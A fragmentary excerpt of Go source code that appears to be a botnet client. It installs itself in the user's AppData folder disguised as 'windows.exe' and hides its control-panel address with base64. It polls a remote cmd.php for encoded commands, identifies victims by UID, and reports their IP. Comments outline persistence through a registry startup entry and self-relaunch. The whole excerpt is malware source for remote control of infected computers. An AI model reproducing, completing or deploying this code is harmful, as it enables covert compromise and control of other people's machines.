...
InstallPath string = os.Getenv("APPDATA") + "\\windows.exe" //Where the bot will install
...
func httpWorker(input string) (string,bool){ // Maybe Encode before transmit message?
	if checkInternet(){ // Check for panel connection
		var query = []byte(input)
    	req, err := http.NewRequest("POST", base64Decode(Panel) + "cmd.php", bytes.NewBuffer(query))
		req.Header.Set("UID", getUID())// sends the UID when checking for command or sending data
		...
		body, _ := ioutil.ReadAll(resp.Body)
  		return base64Decode(string(body)), true //Decodes the command to a readable type
	} else{
		return "", false
	}
}
...
//------------------------------Command Handler--------------------------------
//data - lastcommand - chk - cmd - var1 -var2 -var3 ....ect
func cmdHandler(data string)bool{ //Return true if command done, flase if error
	if data == LastCMD{
...
func checkIP() (string, error) {
    rsp, err := http.Get(base64Decode(Panel)+ "cmd.php?cmd=ip")
    if err != nil {
        return "", err
    }
    defer rsp.Body.Close()
...
func checkInternet() (bool) { //Connect to cmd.php and see if it replys with just "ok" to check connection
    rsp, err := http.Get(base64Decode(Panel)+ "cmd.php?cmd=test")
    if err != nil {
...
//------------------Install & Uninstall-----------------------
	...
	//generate a random subfolder using an array of commen names
	//copy file to new location
	//add new file to registry for startup
	//run new program (run arg to have it wait before running SingleInstance?)
	//kill self
